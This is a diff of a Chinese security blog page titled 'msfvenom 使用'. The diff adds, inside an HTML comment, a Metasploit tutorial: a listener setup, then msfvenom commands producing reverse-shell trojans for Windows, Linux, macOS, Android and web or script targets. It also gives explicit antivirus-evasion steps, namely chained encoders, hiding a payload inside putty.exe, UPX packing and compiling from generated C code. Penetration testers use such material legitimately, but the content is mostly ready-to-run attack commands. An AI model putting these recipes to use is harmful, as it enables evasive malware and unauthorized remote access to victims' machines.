@@ -11,17 +11,17 @@
   <title>msfvenom 使用 | Pa55w0rd &#39;s Blog</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="目录{:toc}  木马连接方式 正向连接(bind)   是我主动去连接别人机器上的某个端口,很显然,这样极易被对方防火墙拦掉  反向连接(reverse)   是让别人机器上的某个端口上的流量主动连到我机器上的某个端口上,起码暂时对各类应用层防火墙的穿透效果还是蛮不错的   msfvenom 常用选项123456789-l  列出所有可用的payload,编码器,空指令……-p  指定要使用">
+  <meta name="description" content="木马连接方式 正向连接(bind)   是我主动去连接别人机器上的某个端口,很显然,这样极易被对方防火墙拦掉  反向连接(reverse)   是让别人机器上的某个端口上的流量主动连到我机器上的某个端口上,起码暂时对各类应用层防火墙的穿透效果还是蛮不错的">
 <meta property="og:type" content="article">
 <meta property="og:title" content="msfvenom 使用">
 <meta property="og:url" content="http://pa55w0rd.github.io/msfvenom 使用/index.html">
 <meta property="og:site_name" content="Pa55w0rd &#39;s Blog">
-<meta property="og:description" content="目录{:toc}  木马连接方式 正向连接(bind)   是我主动去连接别人机器上的某个端口,很显然,这样极易被对方防火墙拦掉  反向连接(reverse)   是让别人机器上的某个端口上的流量主动连到我机器上的某个端口上,起码暂时对各类应用层防火墙的穿透效果还是蛮不错的   msfvenom 常用选项123456789-l  列出所有可用的payload,编码器,空指令……-p  指定要使用">
+<meta property="og:description" content="木马连接方式 正向连接(bind)   是我主动去连接别人机器上的某个端口,很显然,这样极易被对方防火墙拦掉  反向连接(reverse)   是让别人机器上的某个端口上的流量主动连到我机器上的某个端口上,起码暂时对各类应用层防火墙的穿透效果还是蛮不错的">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-11-20T10:08:47.746Z">
+<meta property="og:updated_time" content="2018-11-20T10:37:31.052Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="msfvenom 使用">
-<meta name="twitter:description" content="目录{:toc}  木马连接方式 正向连接(bind)   是我主动去连接别人机器上的某个端口,很显然,这样极易被对方防火墙拦掉  反向连接(reverse)   是让别人机器上的某个端口上的流量主动连到我机器上的某个端口上,起码暂时对各类应用层防火墙的穿透效果还是蛮不错的   msfvenom 常用选项123456789-l  列出所有可用的payload,编码器,空指令……-p  指定要使用">
+<meta name="twitter:description" content="木马连接方式 正向连接(bind)   是我主动去连接别人机器上的某个端口,很显然,这样极易被对方防火墙拦掉  反向连接(reverse)   是让别人机器上的某个端口上的流量主动连到我机器上的某个端口上,起码暂时对各类应用层防火墙的穿透效果还是蛮不错的">
 
   
 
@@ -187,20 +187,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-
-        <br>
-        <span id="busuanzi_container_page_pv">
-          阅读次数<span id="busuanzi_value_page_pv"></span>
-        </span>
-        <ul>
-<li>目录<br>{:toc}</li>
-</ul>
-<h2 id="木马连接方式"><a href="#木马连接方式" class="headerlink" title="木马连接方式"></a>木马连接方式</h2><ul>
+        
+        
+          <h2 id="木马连接方式"><a href="#木马连接方式" class="headerlink" title="木马连接方式"></a>木马连接方式</h2><ul>
 <li><p>正向连接(bind)</p>
 <p>  是我主动去连接别人机器上的某个端口,很显然,这样极易被对方防火墙拦掉</p>
 </li>
 <li><p>反向连接(reverse)</p>
 <p>  是让别人机器上的某个端口上的流量主动连到我机器上的某个端口上,起码暂时对各类应用层防火墙的穿透效果还是蛮不错的</p>
+  <a id="more"></a>
 </li>
 </ul>
 <h2 id="msfvenom-常用选项"><a href="#msfvenom-常用选项" class="headerlink" title="msfvenom 常用选项"></a>msfvenom 常用选项</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-l  列出所有可用的payload,编码器,空指令……</span></span><br><span class="line"><span class="deletion">-p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的</span></span><br><span class="line"><span class="deletion">-f  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式</span></span><br><span class="line"><span class="deletion">-e  指定要使用那种编码器</span></span><br><span class="line"><span class="deletion">-i  指定编码的次数,如果使用编码器</span></span><br><span class="line"><span class="deletion">-b  指定坏字符,比如空字符截断问题,等等……</span></span><br><span class="line"><span class="deletion">-x  使用一个自定义可执行程序模板,并将payload嵌入其中</span></span><br><span class="line"><span class="deletion">-k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用</span></span><br><span class="line"><span class="deletion">-o  指定创建好的payload的存放位置</span></span><br></pre></td></tr></table></figure>
@@ -229,6 +224,47 @@
 <figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># msfvenom -p ruby/shell_reverse_tcp LHOST=<span class="meta-string">&lt;ip&gt;</span> LPORT=<span class="meta-string">&lt;port&gt;</span> -f raw -o x86_shell.rb</span></span><br></pre></td></tr></table></figure>
 <p><strong>lua</strong></p>
 <figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># msfvenom -p cmd/unix/reverse_lua LHOST=<span class="meta-string">&lt;ip&gt;</span> LPORT=<span class="meta-string">&lt;port&gt;</span> -f raw -o x86_shell.lua</span></span><br></pre></td></tr></table></figure>
+        
+<!--
+        </br>
+        <span id="busuanzi_container_page_pv">
+          阅读次数<span id="busuanzi_value_page_pv"></span>
+        </span>
+        <h2 id="木马连接方式"><a href="#木马连接方式" class="headerlink" title="木马连接方式"></a>木马连接方式</h2><ul>
+<li><p>正向连接(bind)</p>
+<p>  是我主动去连接别人机器上的某个端口,很显然,这样极易被对方防火墙拦掉</p>
+</li>
+<li><p>反向连接(reverse)</p>
+<p>  是让别人机器上的某个端口上的流量主动连到我机器上的某个端口上,起码暂时对各类应用层防火墙的穿透效果还是蛮不错的</p>
+  <a id="more"></a>
+</li>
+</ul>
+<h2 id="msfvenom-常用选项"><a href="#msfvenom-常用选项" class="headerlink" title="msfvenom 常用选项"></a>msfvenom 常用选项</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-l  列出所有可用的payload,编码器,空指令……</span></span><br><span class="line"><span class="deletion">-p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的</span></span><br><span class="line"><span class="deletion">-f  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式</span></span><br><span class="line"><span class="deletion">-e  指定要使用那种编码器</span></span><br><span class="line"><span class="deletion">-i  指定编码的次数,如果使用编码器</span></span><br><span class="line"><span class="deletion">-b  指定坏字符,比如空字符截断问题,等等……</span></span><br><span class="line"><span class="deletion">-x  使用一个自定义可执行程序模板,并将payload嵌入其中</span></span><br><span class="line"><span class="deletion">-k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用</span></span><br><span class="line"><span class="deletion">-o  指定创建好的payload的存放位置</span></span><br></pre></td></tr></table></figure>
+<h2 id="使用msf创建监听器"><a href="#使用msf创建监听器" class="headerlink" title="使用msf创建监听器"></a>使用msf创建监听器</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/multi/<span class="keyword">handler</span></span><br><span class="line"><span class="keyword">set</span> PAYLOAD &lt;Payload <span class="keyword">name</span>&gt;</span><br><span class="line"><span class="keyword">set</span> LHOST &lt;LHOST <span class="keyword">value</span>&gt;</span><br><span class="line"><span class="keyword">set</span> LPORT &lt;LPORT <span class="keyword">value</span>&gt;</span><br><span class="line"><span class="keyword">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>
+<h2 id="创建Metasploit-payload"><a href="#创建Metasploit-payload" class="headerlink" title="创建Metasploit payload"></a>创建Metasploit payload</h2><p>直接使用msfvenom生成的反弹shell程序一般都会被杀毒软件无情差杀掉<br>避免被查杀的最普遍方法是编码，简单来说就是改变可执行文件中的代码形状，从而让只识别静态特征码的杀毒软件无法识别，且当木马运行之后，木马会将原始程序解码到内存中，如此木马原来的功能自然也不会受到影响</p>
+<p>可以使用<code>x86/shikata_ga_nai</code>动态编码器进行混淆，简单单次混淆一般都能被杀毒软件先解码再查杀识别出来，那么尝试使用 <strong>多重编码器多次混淆</strong><br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e <span class="keyword">x</span><span class="number">86</span>/shikata_ga_nai -i <span class="number">10</span> -f raw | msfvenom -e <span class="keyword">x</span><span class="number">86</span>/alpha_upper -a <span class="keyword">x</span><span class="number">86</span> --platform windows -<span class="keyword">i5</span> -f raw | msfvenom -e <span class="keyword">x</span><span class="number">86</span>/shikkata_ga_nai -a <span class="keyword">x</span><span class="number">86</span> --platform windows -i <span class="number">10</span> -f raw | msfvenom -e <span class="keyword">x</span><span class="number">86</span>/countdown -a <span class="keyword">x</span><span class="number">86</span> --platform windows -i <span class="number">10</span> -b '\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">0</span>a\xff' -f exe -o shell.exe</span><br></pre></td></tr></table></figure></p>
+<p>如果进行多次编码的马儿还是被查杀，可以尝试 <strong>更换可执行文件模板</strong>，重新生成木马<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -x putty<span class="selector-class">.exe</span> -k -<span class="selector-tag">i</span> <span class="number">5</span> -f exe -o shell.exe</span><br></pre></td></tr></table></figure></p>
+<p>发现更换可执行文件模板的马儿依然被查杀，编码和更换模板都行不通，可以试试 <strong>加壳</strong>。软件加壳基本原理就是对可执行文件进行加密压缩，执行之后将代码解压为原始程序，这里分别使用5、9级别upx加壳等级对木马进行加壳<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upx -<span class="number">5</span> shell<span class="selector-class">.exe</span> -o upx5_shell.exe</span><br><span class="line">upx -<span class="number">9</span> shell<span class="selector-class">.exe</span> -o upx9_shell.exe</span><br></pre></td></tr></table></figure></p>
+<p>将木马藏在可执行文件里面，文件的md5值会发生改变，杀毒软件将文件与官方原版文件进行对比即可判断是否异常，这里 <strong>换一个不常见的可执行文件模板（可以是自己写的）</strong><br>还有可以不直接生成可执行文件，而是 <strong>生成c代码</strong><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -<span class="selector-tag">a</span> x86 --platform windows LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -<span class="selector-tag">i</span> <span class="number">15</span> -<span class="selector-tag">b</span> <span class="string">'\x00\' -f c -o shell.c</span></span><br></pre></td></tr></table></figure></p>
+<p>利用编译器编译生成可执行文件来绕过杀软</p>
+<p><strong>windows平台</strong><br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># msfvenom -a <span class="keyword">x</span><span class="number">86</span> --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e <span class="keyword">x</span><span class="number">86</span>/shikata_ga_nai -b '\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">0</span>a\xff' -i <span class="number">3</span> -f exe -o <span class="keyword">x</span><span class="number">86</span>_shell.exe</span><br><span class="line"># msfvenom -a <span class="keyword">x</span><span class="number">86</span> --platform Windows -p windows/powershell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e cmd/powershell_base<span class="number">64</span> -i <span class="number">3</span> -f raw -o <span class="keyword">x</span><span class="number">86</span>_shell.ps<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>linux平台</strong><br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="meta-string">&lt;ip&gt;</span> LPORT=<span class="meta-string">&lt;port&gt;</span> -f elf -o shell.elf</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>mac平台</strong><br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># msfvenom -a <span class="keyword">x</span><span class="number">86</span> --platform osx -p osx/<span class="keyword">x</span><span class="number">86</span>/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f macho -o <span class="keyword">x</span><span class="number">86</span>_shell.macho</span><br></pre></td></tr></table></figure></p>
+<p><strong>android平台</strong><br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># msfvenom -a x86 --platform <span class="keyword">Android </span>-p <span class="keyword">android/meterpreter/reverse_tcp </span>LHOST=&lt;<span class="built_in">ip</span>&gt; LPORT=&lt;port&gt; -f apk -o x86_shell.apk</span><br></pre></td></tr></table></figure></p>
+<p><strong>Web Payloads</strong></p>
+<p><strong>PHP</strong><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp <span class="attribute">LHOST</span>=&lt;ip&gt; <span class="attribute">LPORT</span>=&lt;port&gt; -f<span class="built_in"> raw </span>-o shell.php</span><br></pre></td></tr></table></figure></p>
+<p><strong>ASP</strong><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=&lt;ip&gt; <span class="attribute">LPORT</span>=&lt;port&gt; -f asp -o shell.asp</span><br></pre></td></tr></table></figure></p>
+<p><strong>JSP</strong><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=&lt;ip&gt; <span class="attribute">LPORT</span>=&lt;port&gt; -f<span class="built_in"> raw </span>-o shell.jsp</span><br></pre></td></tr></table></figure></p>
+<p><strong>WAR</strong><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=&lt;ip&gt; <span class="attribute">LPORT</span>=&lt;port&gt; -f war -o shell.war</span><br></pre></td></tr></table></figure></p>
+<p><strong>Script Payloads</strong></p>
+<p><strong>Python</strong><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter_reverse_tcp <span class="attribute">LHOST</span>=&lt;ip&gt; <span class="attribute">LPORT</span>=&lt;port&gt; -f<span class="built_in"> raw </span>-o rshell.py</span><br></pre></td></tr></table></figure></p>
+<p><strong>Perl</strong><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl <span class="attribute">LHOST</span>=&lt;ip&gt; <span class="attribute">LPORT</span>=&lt;port&gt; -f<span class="built_in"> raw </span>-o shell.pl</span><br></pre></td></tr></table></figure></p>
+<p><strong>Node.js</strong><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp <span class="attribute">LHOST</span>=&lt;ip&gt; <span class="attribute">LPORT</span>=&lt;port&gt; -f<span class="built_in"> raw </span>-o shell.js</span><br></pre></td></tr></table></figure></p>
+<p><strong>Bash</strong><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash <span class="attribute">LHOST</span>=&lt;ip&gt; <span class="attribute">LPORT</span>=&lt;port&gt; -f<span class="built_in"> raw </span>-o shell.sh</span><br></pre></td></tr></table></figure></p>
+<p><strong>ruby</strong></p>
+<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># msfvenom -p ruby/shell_reverse_tcp LHOST=<span class="meta-string">&lt;ip&gt;</span> LPORT=<span class="meta-string">&lt;port&gt;</span> -f raw -o x86_shell.rb</span></span><br></pre></td></tr></table></figure>
+<p><strong>lua</strong></p>
+<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># msfvenom -p cmd/unix/reverse_lua LHOST=<span class="meta-string">&lt;ip&gt;</span> LPORT=<span class="meta-string">&lt;port&gt;</span> -f raw -o x86_shell.lua</span></span><br></pre></td></tr></table></figure>-->
       
 
     </div>
@@ -239,7 +275,7 @@
 
     <footer class="article-footer">
       
-        <a data-url="http://pa55w0rd.github.io/msfvenom 使用/" data-id="cjopkqnlj000vj3t6or6wmd5g" class="article-share-link" data-share="baidu" data-title="msfvenom 使用">分享到</a>
+        <a data-url="http://pa55w0rd.github.io/msfvenom 使用/" data-id="cjopl5zpb000gkbt6zhmkkhtt" class="article-share-link" data-share="baidu" data-title="msfvenom 使用">分享到</a>
       
 
       
@@ -260,11 +296,11 @@
     </a>
   
   
-    <a href="/快速定位前端加密方法/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/代理/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">下一篇 →</strong>
       <div class="article-nav-title">
         
-          快速定位前端加密方法（转发）
+          代理
         
       </div>
     </a>
